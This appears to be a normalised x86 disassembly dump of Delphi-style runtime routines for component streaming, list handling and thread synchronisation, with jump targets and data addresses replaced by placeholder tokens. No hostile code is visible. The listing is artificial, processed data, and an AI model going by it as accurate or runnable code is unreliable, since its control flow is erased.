pop ecx
sub_420a58
push ebp
mov ebp esp
add esp 0xfffffec4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x1c ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_420e34
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_414648
test al al
je r-xdata
mov eax ebx
call sub_4144e0
and ax 0xfff
movzx eax ax
cmp eax 0x7
jg r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
cmp eax 0x10
jge r-xdata
je r-xdata
add eax 0xfffffff0
sub eax 0x3
jb r-xdata
sub eax 0x8
je r-xdata
mov eax ebx
call sub_411528
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41f670
jmp r-xdata
cmp eax 0x6
ja r-xdata
mov eax ebx
call sub_40fbd8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41f758
jmp r-xdata
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x2c ]
mov edx ebx
call sub_412c60
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_420fec
jmp r-xdata
sub eax 0x3
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420e3b
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_403fa0
lea eax [ ebp - 0x34 ]
call sub_4058a0
lea eax [ ebp - 0x30 ]
call sub_403f7c
lea eax [ ebp - 0x2c ]
call sub_40465c
lea eax [ ebp - 0x1c ]
call sub_4058a0
retn
xor eax eax
push ebp
push sub_420dd8
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov ax [ ebx ]
call sub_414940
test al al
je r-xdata
jmp [ eax * 4 + jump_table_420ad6 ]
mov eax ebx
call sub_41069c
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41f7cc
jmp r-xdata
sub eax 0xeb
je r-xdata
mov eax ebx
call sub_410fe0
test al al
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x38 ]
mov edx ebx
call sub_412538
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_420f98
jmp r-xdata
lea eax [ ebp - 0x1c ]
call sub_4058a0
push eax
lea eax [ ebp - 0x34 ]
mov edx ebx
call sub_413238
mov eax [ ebp - 0x34 ]
mov edx r-xdata
pop ecx
call sub_40d548
test al al
jne r-xdata
mov dl 0xd
mov eax [ ebp - 0x4 ]
call sub_4210a0
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4210a0
jmp r-xdata
mov eax ebx
call sub_411528
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41f628
jmp r-xdata
mov eax ebx
call sub_411528
add esp 0xfffffff4
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41f604
jmp r-xdata
mov eax ebx
call sub_411e84
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41f64c
jmp r-xdata
lea eax [ ebp - 0x30 ]
mov edx ebx
call sub_412538
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_420f98
jmp r-xdata
jmp r-xdata
mov dl 0x8
mov eax [ ebp - 0x4 ]
call sub_4210a0
jmp r-xdata
mov dl 0x9
mov eax [ ebp - 0x4 ]
call sub_4210a0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_420dc7
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebp - 0x10 ] eax
push 0x400
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41be14
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_420d6d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x13c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_40313c
lea edx [ ebp - 0x13c ]
lea eax [ ebp - 0x3c ]
call sub_4041e0
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x14 ]
call sub_420f98
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax [ ebp - 0x14 ]
call sub_41ee48
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_41ee48
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420d74
mov eax [ ebp - 0x14 ]
call sub_4031ec
retn
sub_420d74
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x18 ] eax
mov dl 0xa
mov eax [ ebp - 0x4 ]
call sub_4210a0
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_41ee48
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41ee48
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4031ec
mov eax [ ebp - 0xc ]
call sub_4031ec
retn
sub_420e54
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_420e9a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov ecx esi
mov edx [ ebx + 0x2c ]
call sub_404288
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_420eb8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420ea1
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_420eb8
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_40423c
mov [ esp ] eax
cmp [ esp ] 0xff
jle r-xdata
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41ee48
mov eax esi
call sub_40443c
mov edx eax
mov ecx [ esp ]
mov eax ebx
call sub_41ee48
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xff
sub_420f00
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_404388
je r-xdata
mov eax esi
call sub_40423c
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
mov eax edi
call sub_40423c
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_4210a0
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41ee48
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_41ee48
jmp r-xdata
mov dl 0xc
mov eax ebx
call sub_4210a0
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41ee48
mov dl 0x6
mov eax ebx
call sub_4210a0
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41ee48
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_41ee48
sub_420f98
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_420fdd
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405d14
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_420f00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420fe4
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_420fec
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_421092
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_405bc4
mov eax [ ebp - 0x8 ]
call sub_40423c
mov edi eax
mov eax ebx
call sub_4047c8
add eax eax
cmp edi eax
jge r-xdata
mov dl 0x12
mov eax esi
call sub_4210a0
mov eax ebx
call sub_4047c8
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax esi
call sub_41ee48
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx ebx
mov eax esi
call sub_41ee48
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_404204
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_420f00
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421099
lea eax [ ebp - 0xc ]
call sub_403f7c
lea eax [ ebp - 0x8 ]
call sub_403f7c
retn
sub_4210b4
push ebp
mov ebp esp
push ebx
mov ebx [ eax + 0x20 ]
mov [ edx ] ebx
mov edx [ eax + 0x18 ]
mov [ ecx ] edx
mov edx [ ebp + 0xc ]
mov ecx [ eax + 0x1c ]
mov [ edx ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ eax + 0x28 ]
mov [ edx ] eax
pop ebx
pop ebp
retn 0x8
sub_42114c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc04
call sub_4039b8
call sub_421124
mov eax ebx
call sub_421130
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4212da
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4212bb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4212c2
mov eax [ ebp - 0xc ]
call sub_4031ec
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_418dc4
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_418cb4
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_421285
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_421256
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_4212ec
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov al [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_4214a4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_421338
push ebx
push esi
push ecx
call sub_4035b8
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_42158c
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_421534
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebx
call sub_4193ac
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_4214fc
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_4035a0
lea eax [ ebx + 0x14 ]
call sub_40d538
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_418dc4
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_4213bc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_418e20
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_418c68
mov edx ebx
mov eax esi
call sub_4213bc
sub_421450
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_418c68
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebx + 0x10 ] eax
sub_42147c
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_418f60
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_4031ec
xor eax eax
mov [ ebx + 0x10 ] eax
sub_4214a4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_4033e8
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_421450
mov dl 0x1
mov eax ebx
call sub_4219c4
test [ edi + 0x1c ] 0x10
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_421974
sub_4214fc
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_4219c4
mov edx ebx
mov eax esi
call sub_42147c
pop edi
pop esi
pop ebx
retn
sub_421534
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_418eac
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_4214fc
jmp r-xdata
mov ax [ r-xdata ]
and ax [ esi + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_42147c
sub_42158c
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_418dc4
call sub_42158c
inc edi
dec esi
jne r-xdata
sub_4215c8
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_418f60
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_4031ec
xor eax eax
mov [ ebx + 0x14 ] eax
sub_4215ec
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4215c8
mov edx ebx
mov eax esi
call sub_4215c8
pop esi
pop ebx
retn
sub_421608
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_4215ec
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_418dc4
mov cl [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x8 ]
cmp ebx eax
jl r-xdata
test ebx ebx
jge r-xdata
mov ebx eax
dec ebx
sub_421664
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_421410
push ebx
push sub_421438
mov ax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_421424
push ebx
push sub_421444
mov ax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_42175c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_407fbc
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_4217f4
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc04
call sub_4039b8
sub_4217f4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_418dc4
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_407fbc
test al al
jne r-xdata
sub_421844
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_404388
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
call sub_40810c
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc04
call sub_4039b8
xor edx edx
mov eax ebx
call sub_4219c4
mov edx esi
mov eax ebx
call sub_4218d0
mov dl 0x1
mov eax ebx
call sub_4219c4
sub_4218e4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_418dc4
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_418d50
sub_421920
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_418e20
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_418cb4
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_418e40
sub_421974
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_421910
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_4218e4
mov cl 0x1
mov edx ebx
call sub_421974
inc edi
dec ebp
jne r-xdata
sub_4219c4
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_404218
mov edx esp
mov eax esi
call sub_403500
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_421a0c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_421a34
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_421a7c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_4032a0
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_421adc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_421b00
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031bc
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_421b48
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4031dc
test bl bl
jle r-xdata
mov edx esi
call sub_421d78
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_421bb0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_421d78
mov edx ebx
mov eax esi
call sub_421d6c
sub_421bf4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4212ec
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_421c38
push ebx
push esi
push edi
call sub_4035b8
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_421338
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx edi
call sub_4215ec
jmp r-xdata
mov eax esi
call sub_418eac
mov edx eax
mov eax edi
call sub_421d78
lea eax [ edi + 0x50 ]
call sub_40d538
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035a0
sub_421c98
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_421608
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_421cc4
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_421ce0
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_421cfc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_418dc4
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_421d78
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_418cb4
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_418dc4
cmp ebp eax
jne r-xdata
sub_421db8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_4215ec
mov edx ebx
call sub_4213bc
sub_421de4
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031bc
mov [ edi + 0xc ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax edi
pop edi
pop esi
pop ebx
